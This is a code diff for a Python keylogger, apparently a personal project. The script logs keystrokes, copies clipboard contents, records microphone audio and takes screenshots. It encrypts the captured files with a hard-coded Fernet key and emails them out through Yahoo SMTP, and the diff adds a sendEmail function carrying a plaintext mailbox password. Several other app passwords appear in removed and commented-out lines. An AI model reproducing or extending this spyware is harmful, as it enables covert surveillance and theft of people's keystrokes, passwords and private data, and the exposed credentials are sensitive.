@@ -48,6 +48,7 @@ clipboardInfoEnc = "clipboardEnc.txt"
 keyInfoEnc = "keyLogEnc.txt"
 fromAdd = "testcodestuff@yahoo.com"
 toAdd = "testcodestuff@yahoo.com"
+key = "aI1VNWqKJaT6XWmT5yWFMo5oNWqc2D4lUyEGX9bVFMA="
 filesToEncrypt = [systemInfo, clipboardInfo, keyInfo]
 encryptedFiles = [systemInfoEnc, clipboardInfoEnc, keyInfoEnc]
 
@@ -55,60 +56,64 @@ count = 0
 keys = []
 iterations = 0
 timeIter = 15
-endIter = 2
+endIter = 1
 currentTime = time.time()
 stopTime = time.time() + timeIter
-genKey = Fernet.generate_key()
-
-for encryptingFile in filesToEncrypt:
-    with open(filesToEncrypt[count], 'rb') as f:
-        data = f.read()
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
-    with open(encryptedFiles[count], 'wb') as f:
-        f.write(encrypted)
-    sendEmail(encryptedFiles[count], toAdd)
-    count += 1
-time.sleep(120)
 
 #Function that creates and sends an email with an attachment
-def sendEmail(fileName,toAdd):
-    msg = MIMEMultipart()
-    msg["From"] = fromAdd
-    msg["To"] = toAdd
-    msg["Subject"] = "Keylog File"
-    body = "Keylogger do be keylogging!!"
-    msg.attach(MIMEText(body, "plain"))
-    attachment = open(os.path.abspath(fileName), "rb")
-    mimeInst = MIMEBase('application', 'octet-stream') 
-    mimeInst.set_payload((attachment).read())
-    encoders.encode_base64(mimeInst)
-    mimeInst.add_header('Content-Disposition', "attachment; filename= %s" % fileName)
-    msg.attach(mimeInst)
-    smtpSesh = smtplib.SMTP("smtp.mail.yahoo.com", 587) 
-    smtpSesh.starttls()
-    smtpSesh.auth_login("testcodestuff@yahoo.com", "mjjdpsdvorwulllp")
-    txt = msg.as_string()
-    smtpSesh.sendmail(fromAdd, toAdd, txt)
-    smtpSesh.quit()
-
-# def sendEmail():
+# def sendEmail(fileName,toAdd):
 #     email_address = "testcodestuff@yahoo.com"
-#     email_password = "zisqys-ripMys-qutxu0"
-#     smtp_server = "smtp.mail.yahoo.com"
-#     smtp_port = 587
-#     msg = EmailMessage()
-#     msg['Subject'] = 'Re: Hello, World!'
-#     msg['From'] = email_address
-#     msg['To'] = email_address
-#     msg.set_content('Hello Gilfoyle, this is a test email with an attachment. -Dinesh')
-#     with open('keyLog.txt', 'rb') as f:
-#         file_data = f.read()
-#     msg.add_attachment(file_data, maintype='text', subtype='plain', filename='keyLog.txt')
-#     with smtplib.SMTP(smtp_server, smtp_port) as server:
-#         server.starttls()
-#         server.login(email_address, email_password)
-#         server.send_message(msg)
+#     email_password = "owowflacyimjdjrc"
+#     msg = MIMEMultipart()
+#     msg["From"] = fromAdd
+#     msg["To"] = toAdd
+#     msg["Subject"] = "Keylog File"
+#     body = "Keylogger do be keylogging!!"
+#     msg.attach(MIMEText(body, "plain"))
+#     attachment = open(os.path.abspath(fileName), "rb")
+#     mimeInst = MIMEBase('application', 'octet-stream') 
+#     mimeInst.set_payload((attachment).read())
+#     encoders.encode_base64(mimeInst)
+#     mimeInst.add_header('Content-Disposition', "attachment; filename= %s" % fileName)
+#     msg.attach(mimeInst)
+#     smtpSesh = smtplib.SMTP("smtp.mail.yahoo.com", 587) 
+#     smtpSesh.starttls()
+#     smtpSesh.auth_login(email_address, email_password)
+#     txt = msg.as_string()
+#     smtpSesh.sendmail(fromAdd, toAdd, txt)
+#     smtpSesh.quit()
+
+def encryptFiles():
+    count = 0
+    for encryptingFile in filesToEncrypt:
+        with open(filesToEncrypt[count], 'rb') as f:
+            data = f.read()
+        fernet = Fernet(key)
+        encrypted = fernet.encrypt(data)
+        with open(encryptedFiles[count], 'wb') as f:
+            f.write(encrypted)
+        #sendEmail(encryptedFiles[count], toAdd)
+        sendEmail(encryptedFiles[count])
+        count += 1
+    time.sleep(120)
+
+def sendEmail(fileName):
+    email_address = "testcodestuff@yahoo.com"
+    email_password = "owowflacyimjdjrc"
+    smtp_server = "smtp.mail.yahoo.com"
+    smtp_port = 587
+    msg = EmailMessage()
+    msg['Subject'] = 'Re: Keylog File'
+    msg['From'] = email_address
+    msg['To'] = email_address
+    msg.set_content("Keylogger do be keylogging!!")
+    with open(fileName, 'rb') as f:
+        file_data = f.read()
+    msg.add_attachment(file_data, maintype='text', subtype='plain', filename=fileName)
+    with smtplib.SMTP(smtp_server, smtp_port) as server:
+        server.starttls()
+        server.login(email_address, email_password)
+        server.send_message(msg)
 
 def clipInfo():
     with open(clipboardInfo, "a") as f:
@@ -150,6 +155,7 @@ def micRec():
     sd.wait()
     write(audioInfo, fs, myrecording)
 
+#Function that captures screenshots
 def screenInfo():
     image = ImageGrab.grab()
     image.save(screenshotInfo)
@@ -184,30 +190,25 @@ while iterations < endIter:
     def onRelease(key):
         if key == Key.esc:
             return False
-        if currentTime > stopTime:
-            with open("keyInfo", "rb") as f:
-                data = f.read()
-            fernet = Fernet(genKey)
-            encrypted = fernet.encrypt(data)
-            with open("keyInfoEnc", "wb") as f:
-                f.write(encrypted)
+        elif currentTime > stopTime:
             return False
 
     #Creates the loop that listens for key events 
     with Listener(on_press = onPress, on_release = onRelease) as listener:
         listener.join()
     if currentTime > stopTime:
-        with open(keyInfo, "w") as f:
-            f.write("")
         clipInfo()
         micRec()
         screenInfo()
+        #compInfo()
+        encryptFiles()
+        with open(keyInfo, "w") as f:
+            f.write("")
         iterations += 1
         currentTime = time.time()
         stopTime = time.time() + timeIter
-print("Path of the file..", os.path.abspath(keyInfo))
 #compInfo()
 #clipInfo()
-sendEmail()
+#sendEmail()
 #micRec()
 #screenInfo()
